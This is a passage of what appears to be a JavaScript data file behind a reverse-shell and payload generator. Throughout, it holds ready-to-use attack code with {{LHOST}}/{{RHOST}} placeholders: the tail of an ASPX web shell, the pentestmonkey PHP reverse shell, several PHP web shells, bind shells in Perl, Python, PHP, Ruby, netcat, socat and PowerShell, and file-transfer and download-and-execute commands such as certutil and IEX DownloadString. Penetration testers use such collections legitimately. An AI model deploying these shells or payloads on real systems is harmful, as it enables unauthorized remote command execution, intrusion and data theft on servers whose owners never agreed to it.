    <table style="width: 100%; border-width: 0px; padding: 5px;">
\t\t<tr>
\t\t\t<td style="width: 50%; vertical-align: top;">
\t\t\t\t<h2>Shell</h2>\t\t\t\t
\t\t\t\t<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
\t\t\t\t<asp:Button runat="server" ID="cmdExec" Text="Execute" />
\t\t\t\t<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
\t\t\t</td>
\t\t\t<td style="width: 50%; vertical-align: top;">
\t\t\t\t<h2>File Browser</h2>
\t\t\t\t<p>
\t\t\t\t\tDrives:<br />
\t\t\t\t\t<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
\t\t\t\t</p>
\t\t\t\t<p>
\t\t\t\t\tWorking directory:<br />
\t\t\t\t\t<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
\t\t\t\t</p>
\t\t\t\t<table style="width: 100%">
\t\t\t\t\t<tr>
\t\t\t\t\t\t<th>Name</th>
\t\t\t\t\t\t<th>Size KB</th>
\t\t\t\t\t\t<th style="width: 50px">Actions</th>
\t\t\t\t\t</tr>
\t\t\t\t\t<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
\t\t\t\t</table>
\t\t\t\t<p>Upload to this directory:<br />
\t\t\t\t<asp:FileUpload runat="server" ID="flUp" />
\t\t\t\t<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
\t\t\t\t</p>
\t\t\t</td>
\t\t</tr>
    </table>

    </form>
</body>
</html>
`,
                "highlight": "language-xml",
                "shorttag": "ASPX web shell - unauthenticated"
            }
        ],
        "php": [
            {
                "title": "pentestmonkey proc_open (Linux)",
                "platform": "Linux/Unix",
                "command": `<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '{{LHOST}}';  // CHANGE THIS
$port = {{LPORT}};       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
\t// Fork and have the parent process exit
\t$pid = pcntl_fork();
\t
\tif ($pid == -1) {
\t\tprintit("ERROR: Can't fork");
\t\texit(1);
\t}
\t
\tif ($pid) {
\t\texit(0);  // Parent exits
\t}

\t// Make the current process a session leader
\t// Will only succeed if we forked
\tif (posix_setsid() == -1) {
\t\tprintit("Error: Can't setsid()");
\t\texit(1);
\t}

\t$daemon = 1;
} else {
\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
\tprintit("$errstr ($errno)");
\texit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
\tprintit("ERROR: Can't spawn shell");
\texit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
\t// Check for end of TCP connection
\tif (feof($sock)) {
\t\tprintit("ERROR: Shell connection terminated");
\t\tbreak;
\t}

\t// Check for end of STDOUT
\tif (feof($pipes[1])) {
\t\tprintit("ERROR: Shell process terminated");
\t\tbreak;
\t}

\t// Wait until a command is end down $sock, or some
\t// command output is available on STDOUT or STDERR
\t$read_a = array($sock, $pipes[1], $pipes[2]);
\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

\t// If we can read from the TCP socket, send
\t// data to process's STDIN
\tif (in_array($sock, $read_a)) {
\t\tif ($debug) printit("SOCK READ");
\t\t$input = fread($sock, $chunk_size);
\t\tif ($debug) printit("SOCK: $input");
\t\tfwrite($pipes[0], $input);
\t}

\t// If we can read from the process's STDOUT
\t// send data down tcp connection
\tif (in_array($pipes[1], $read_a)) {
\t\tif ($debug) printit("STDOUT READ");
\t\t$input = fread($pipes[1], $chunk_size);
\t\tif ($debug) printit("STDOUT: $input");
\t\tfwrite($sock, $input);
\t}

\t// If we can read from the process's STDERR
\t// send data down tcp connection
\tif (in_array($pipes[2], $read_a)) {
\t\tif ($debug) printit("STDERR READ");
\t\t$input = fread($pipes[2], $chunk_size);
\t\tif ($debug) printit("STDERR: $input");
\t\tfwrite($sock, $input);
\t}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
\tif (!$daemon) {
\t\tprint "$string\\n";
\t}
}

?>`,
                "highlight": "language-php",
                "shorttag": "PHP reverse Linux"
            },
            {
                "title": "fsockopen one-liner (Linux, php)",
                "platform": "Linux/Unix",
                "command": `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/bash <&3 >&3 2>&3");'`,
                "highlight": "language-php",
                "shorttag": "PHP reverse local Linux"
            },
            {
                "title": "Webshell (cross-platform, authenticated)",
                "platform": "Linux/Unix && Windows",
                "command": `<?php
$secretKey = 'YourMomHeetsHenk!@4';
$auth = $_GET['auth'] ?? '';
$method = $_GET['method'] ?? '';
$cmd = $_GET['cmd'] ?? '';
$output = '';

if ($auth !== $secretKey) {
    http_response_code(403);
    echo "<h2>403 Forbidden</h2>";
    exit;
}

if (!empty($method) && !empty($cmd)) {
    switch ($method) {
        case 'shell_exec':
            $output = shell_exec($cmd);
            break;
        case 'system':
            ob_start();
            system($cmd);
            $output = ob_get_clean();
            break;
        case 'passthru':
            ob_start();
            passthru($cmd);
            $output = ob_get_clean();
            break;
        case 'exec':
            $output = exec($cmd);
            break;
        default:
            $output = "Invalid method selected.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #f0f0f0;
            font-family: Consolas, monospace;
            padding: 20px;
        }
        form {
            margin-bottom: 20px;
        }
        select, input[type="text"] {
            width: 60%%;
            padding: 8px;
            background-color: #2e2e2e;
            color: #fff;
            border: 1px solid #444;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            padding: 8px 16px;
            background-color: #007acc;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #005fa3;
        }
        pre {
            background-color: #111;
            padding: 15px;
            border: 1px solid #333;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <h2>PHP Authenticated Web Shell</h2>
    <form method="get">
        <input type="hidden" name="auth" value="<?= htmlspecialchars($secretKey) ?>" />

        <label for="method">Choose Method:</label><br />
        <select name="method" id="method" required>
            <option value="">-- Select Method --</option>
            <option value="shell_exec" <?= $method === 'shell_exec' ? 'selected' : '' ?>>shell_exec</option>
            <option value="system" <?= $method === 'system' ? 'selected' : '' ?>>system</option>
            <option value="passthru" <?= $method === 'passthru' ? 'selected' : '' ?>>passthru</option>
            <option value="exec" <?= $method === 'exec' ? 'selected' : '' ?>>exec</option>
        </select><br /><br />

        <label for="cmd">Enter Command:</label><br />
        <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($cmd) ?>" required /><br /><br />

        <input type="submit" value="Execute Command" />
    </form>

    <?php if (!empty($output)): ?>
        <h3>Output:</h3>
        <pre><?= htmlspecialchars($output) ?></pre>
    <?php endif; ?>
</body>
</html>
`,
                "highlight": "language-php",
                "shorttag": "PHP web shell"
            },
            {
                "title": "Webshell (cross-platform, multi-method)",
                "platform": "Linux/Unix && Windows",
                "command": `<?php
if(isset($_GET['m'],$_GET['c'])){
  $m=$_GET['m'];$c=$_GET['c'];
  echo "<b>$m</b>: <b>$c</b><br><pre>";
  if($m=='exec'){exec($c,$o);echo join("\\n",$o);}
  if($m=='shell_exec')echo shell_exec($c);
  if($m=='system'){ob_start();system($c);echo ob_get_clean();}
  if($m=='passthru'){ob_start();passthru($c);echo ob_get_clean();}
  if($m=='popen'){$h=popen($c,'r');while(!feof($h))echo fread($h,1024);pclose($h);}
  if($m=='proc_open'){$d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$p=proc_open($c,$d,$pipes);echo stream_get_contents($pipes[1]);fclose($pipes[1]);proc_close($p);}
  echo "</pre>";
}else echo "Usage: ?m=exec&c=whoami";
?>`,
                "highlight": "language-php",
                "shorttag": "PHP web shell"
            },
            {
                "title": "Webshell (cross-platform, one-liner)",
                "platform": "Linux/Unix && Windows",
                "command": `# 1. using cmd > ?cmd=id
<?php system($_GET['cmd']); ?>

# 2. using an integer > ?0=id
<?php echo system($_GET[0]) ?>`,
                "highlight": "language-php",
                "shorttag": "PHP web shell"
            }
        ],
    }
};

const bindShells = {
    "bind_shell": {
        "perl": [
            {
                "title": "Socket accept + exec (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)
perl -e '
use Socket;
$p={{RPORT}};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die "Socket creation failed: $!";
bind(S,sockaddr_in($p, INADDR_ANY)) or die "Bind failed: $!";
listen(S,SOMAXCONN) or die "Listen failed: $!";
while ($p = accept(C,S)) {
    open(STDIN, ">&C") or die "Dup STDIN failed: $!";
    open(STDOUT, ">&C") or die "Dup STDOUT failed: $!";
    open(STDERR, ">&C") or die "Dup STDERR failed: $!";
    exec("/bin/bash -i") or die "Exec failed: $!";
    close C;
}
'
# Connect from attacker
nc {{RHOST}} {{RPORT}}`,
                "highlight": bash,
                "shorttag": "Perl TCP Bind shell"
            }
        ],
        "python3": [
            {
                "title": "Subprocess one-liner (Linux, Python3)",
                "platform": "Linux/Unix, Python 3",
                "command": `# Victim (listen)
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{{RPORT}}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

# Connect from attacker
nc {{RHOST}} {{RPORT}}
`,
                "highlight": bash,
                "shorttag": "Python single line"
            }
        ],
        "php": [
            {
                "title": "socket_create + popen (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)                
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{{RPORT}});\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
socket_write($cl,$m,strlen($m));}}'

# Connect from attacker
nc {{RHOST}} {{RPORT}}
`,
                "highlight": bash,
                "shorttag": "PHP bind shell"
            }
        ],
        "ruby": [
            {
                "title": "TCPServer fd reopen (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)
ruby -rsocket -e 'f=TCPServer.new({{RPORT}}); s=f.accept; [0, 1, 2].each { |fd| IO.for_fd(fd).reopen(s) }; exec "/bin/sh"'

# Connect from attacker
nc {{RHOST}} {{RPORT}}
`,
                "highlight": bash,
                "shorttag": "Ruby bind shell"
            }
        ],
        "nc (traditional)": [
            {
                "title": "nc -e /bin/bash (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)
nc -nlvp {{RPORT}} -e /bin/bash

# Connect from attacker
nc {{RHOST}} {{RPORT}}
`,
                "highlight": bash,
                "shorttag": "Netcat Traditional"
            }
        ],
        "nc OpenBsd": [
            {
                "title": "mkfifo + nc -lvp (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {{RPORT}} >/tmp/f

# Connect from attacker
nc {{RHOST}} {{RPORT}}

`,
                "highlight": bash,
                "shorttag": "Netcat OpenBsd"
            }
        ],
        "socat": [
            {
                "title": "socat PTY shell (Linux)",
                "platform": "Linux/Unix",
                "command": `# Victim (listen)
socat TCP-LISTEN:{{RPORT}},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

# Connect from attacker
socat FILE:\`tty\`,raw,echo=0 TCP:{{RHOST}}:{{RPORT}}`,
                "highlight": bash,
                "shorttag": "Socat bind shell"
            }
        ],
        "powershell": [
            {
                "title": "Powercat listener (Windows)",
                "platform": "Windows",
                "command": `# https://github.com/besimorhino/powercat
# instructions:
# Load The Function From Downloaded .ps1 File:
. .\\powercat.ps1

# Load The Function From URL:
IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Victim (listen)
. .\\powercat.ps1
powercat -l -p {{RPORT}} -e powershell

# Connect from attacker
nc {{RHOST}} {{RPORT}}`,
                "highlight": powershell,
                "shorttag": "Powershell bind shell"
            }
        ]
    }
};

const transferMethods = {
    "transfer_files": {
        "linux": [
            {
                "title": "1: Transfer files using /dev/tcp",
                "platform": "Linux/Unix",
                "command": `# Using /dev/tcp
{ exec 3<> /dev/tcp/{{LHOST}}/80 && printf '%s\\r\\n' 'GET /{filepath} HTTP/1.1' 'Host: host' 'Connection: close' '' >&3 && cat <&3 && exec 3<&-; } > {newfilename}`,
                "highlight": bash,
                "shorttag": "/dev/tcp"
            },
            {
                "title": "2: Transfer files using Telnet",
                "platform": "Linux/Unix",
                "command": `# Using Telnet
(echo "GET /{filepath} HTTP/1.1"; echo ""; sleep 1) | telnet {{LHOST}} 80 > {newfilename}`,
                "highlight": bash,
                "shorttag": "Telnet"
            },
            {
                "title": "3: Transfer files using Wget",
                "platform": "Linux/Unix",
                "command": `# Using Wget
wget http://{{LHOST}}:80/{filepath} -O {newfilename}`,
                "highlight": bash,
                "shorttag": "Wget"
            },
            {
                "title": "4: Transfer files using Curl",
                "platform": "Linux/Unix",
                "command": `# Using Curl
curl http://{{LHOST}}:80/{filepath} -o {newfilename}`,
                "highlight": bash,
                "shorttag": "Curl"
            },
            {
                "title": "5: Tranfer files using an SMB Share",
                "platform": "Linux/Unix",
                "command": `# 1. Create a network share on the attacker machine (smbserver.py)
smbserver.py {sharename} {sharepath} -smb2support

# 2. mount the remote smb share to a local directory
mount -t cifs //{{LHOST}}/{sharename} /mnt/{sharename} -o ro,vers=2.0

# 3. copy the file from the local file path to the victim machine
cp {filepath} {newfilename}`,
                "highlight": bash,
                "shorttag": "Smb share"
            },

        ],
        "windows": [
            {
                "title": "1: CMD (Certutil)",
                "platform": "Windows",
                "command": `certutil -urlcache -f http://{{LHOST}}:80/{filepath} {newfilename}`,
                "highlight": powershell,
                "shorttag": "CMD"
            },
            {
                "title": "2: Curl",
                "platform": "Windows",
                "command": `curl http://{{LHOST}}:80/{filepath} -o {newfilename}`,
                "highlight": powershell,
                "shorttag": "Curl"
            },
            {
                "title": "3: PowerShell iwr",
                "platform": "Windows",
                "command": `iwr -uri http://{{LHOST}}:80/{filepath} -Outfile {newfilename}`,
                "highlight": powershell,
                "shorttag": "iwr"
            },
            {
                "title": "4: PowerShell v1",
                "platform": "Windows",
                "command": `(New-Object Net.WebClient).DownloadFile("http://{{LHOST}}:80/{filepath}","{newfilename}")`,
                "highlight": powershell,
                "shorttag": "PowerShell"
            },
            {
                "title": "5: PowerShell v2",
                "platform": "Windows",
                "command": `Invoke-WebRequest -Uri http://{{LHOST}}:80/{filepath} -OutFile {newfilename}`,
                "highlight": powershell,
                "shorttag": "PowerShell"
            },
            {
                "title": "6: PowerShell v3 - download & execute",
                "platform": "Windows",
                "command": `# The file to download should be in human-readable format (e.g. : shell.ps1)
IEX(New-Object System.Net.WebClient).DownloadString('http://{{LHOST}}:80/{filepath}')`,
                "highlight": powershell,
                "shorttag": "PowerShell"
            },
            {
                "title": "7: SMB share",
                "platform": "Windows",
                "command": `# 1. Create a network share on the attacker machine (smbserver.py)
smbserver.py {sharename} {sharepath} -smb2support

# 2. connect to the network share from the victim machine
net use Z: \\\\{{LHOST}}\\{sharename}

# 3. copy the file from the network share on the victim machine
copy Z:\\{filepath} {newfilename}`,
                "highlight": powershell,
                "shorttag": "PowerShell"
            },
        ],
        "tips & tricks": [
            {
                "title": "1: socat - port forwarding",
                "platform": "linux",
                "command": `# forward port 445 on your attacker machine to port 445 on the target IP-adress 
socat TCP-LISTEN:445,fork,reuseaddr tcp:<TARGET_IP>:445`,
                "highlight": bash,
                "shorttag": "socat port forwarding"
            }
        ],
    }
};